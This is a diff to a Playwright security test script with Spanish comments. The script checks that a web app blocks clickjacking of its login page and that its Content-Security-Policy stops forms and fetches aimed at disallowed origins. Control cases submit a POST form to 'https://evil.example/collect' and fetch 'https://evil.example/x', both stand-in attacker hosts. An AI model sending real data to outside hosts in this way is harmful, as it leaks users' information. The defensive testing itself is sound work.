@@ -25,14 +25,14 @@ const rec = (name, ok, detail) => { rows.push({ name, ok: !!ok, detail }); if (!
   }
   // Ningún host externo se resuelve (ni siquiera conexiones especulativas del navegador): solo 127.0.0.1/localhost.
   // Los escenarios con hosts externos se sirven con stubs locales (ctx.route) antes de cualquier resolución.
-  const browser = await chromium.launch({ executablePath: process.env.E2E_CHROME || undefined, args: ["--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE localhost"],
-    proxy: { server: "http://127.0.0.1:9", bypass: "127.0.0.1,localhost" } }); // proxy muerto: lo no local no tiene salida
+  const browser = await chromium.launch({ executablePath: process.env.E2E_CHROME || undefined, args: ["--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE 127.0.0.2, EXCLUDE localhost"] });
+  // (Sin proxy: Chromium no resuelve ningún nombre externo; el runner de CI no define proxy de entorno.)
   // 2. Clickjacking: una página de otro origen intenta incrustar /login.
   const evil = http.createServer((q, s) => { s.setHeader("content-type", "text/html"); s.end(`<!doctype html><iframe id=f src="${BASE}/login" width=800 height=600></iframe>`); });
-  await new Promise((r) => evil.listen(0, "127.0.0.1", r));
+  await new Promise((r) => evil.listen(0, "127.0.0.2", r));
   const port = evil.address().port;
   { const ctx = await browser.newContext(); const p = await ctx.newPage();
-    await p.goto(`http://localhost:${port}/`); await p.waitForTimeout(3000);
+    await p.goto(`http://127.0.0.2:${port}/`); await p.waitForTimeout(3000);
     const frame = p.frames().find((f) => f !== p.mainFrame());
     const loaded = frame ? await frame.evaluate(() => !!document.querySelector("input[name=email]")).catch(() => false) : false;
     await p.screenshot({ path: path.join(OUT, "iframe-bloqueado.png") });
@@ -112,7 +112,7 @@ const rec = (name, ok, detail) => { rows.push({ name, ok: !!ok, detail }); if (!
         });
       }
       await run("control: formulario → 303 → origen no permitido (form-action en redirección, informe)", "report", async (p) => {
-        p.evaluate(() => { const f = document.createElement("form"); f.method = "POST"; f.action = "/probe/evil"; f.target = "_blank"; document.body.append(f); f.submit(); }); await p.waitForTimeout(2000); return p.url();
+        p.evaluate(() => { const f = document.createElement("form"); f.method = "POST"; f.action = "/probe/evil"; f.target = "_blank"; document.body.append(f); f.submit(); }).catch(() => {}); await p.waitForTimeout(2000); return p.url();
       });
       await run("Stripe simulado: formulario directo a checkout.stripe.com", "clean", async (p) => {
         const [pop] = await Promise.all([p.waitForEvent("popup", { timeout: 8000 }), p.evaluate(() => { const f = document.createElement("form"); f.method = "POST"; f.action = "https://checkout.stripe.com/c/pay/cs_test_simulado"; f.target = "_blank"; document.body.append(f); f.submit(); })]);
@@ -120,7 +120,7 @@ const rec = (name, ok, detail) => { rows.push({ name, ok: !!ok, detail }); if (!
       });
       await run("control: formulario directo a origen no permitido (form-action, informe)", "report", async (p) => {
         // target=_blank: el documento de origen sigue vivo y su evento de violación no se pierde con la navegación.
-        p.evaluate(() => { const f = document.createElement("form"); f.method = "POST"; f.action = "https://evil.example/collect"; f.target = "_blank"; document.body.append(f); f.submit(); }); await p.waitForTimeout(1500); return p.url();
+        p.evaluate(() => { const f = document.createElement("form"); f.method = "POST"; f.action = "https://evil.example/collect"; f.target = "_blank"; document.body.append(f); f.submit(); }).catch(() => {}); await p.waitForTimeout(1500); return p.url();
       });
     }
     await run("control: conexión a origen no permitido (connect-src, informe)", "report", (p) => p.evaluate(() => fetch("https://evil.example/x").then(() => "ok", (e) => String(e))));
@@ -133,4 +133,5 @@ const rec = (name, ok, detail) => { rows.push({ name, ok: !!ok, detail }); if (!
   await browser.close();
   fs.writeFileSync(path.join(OUT, "summary.json"), JSON.stringify({ base: BASE, fails, rows }, null, 2));
   console.log(`RESULTADO ${rows.length - fails} PASS / ${fails} FAIL`); process.exit(fails ? 1 : 0);
-})();
+})().catch((e) => { console.log(`FAIL  excepción no controlada: ${String(e?.stack ?? e).slice(0, 600).replace(/\n/g, " | ")}`); process.exit(1); });
+process.on("unhandledRejection", (e) => { console.log(`FAIL  promesa rechazada sin control: ${String(e?.stack ?? e).slice(0, 600).replace(/\n/g, " | ")}`); process.exit(1); });
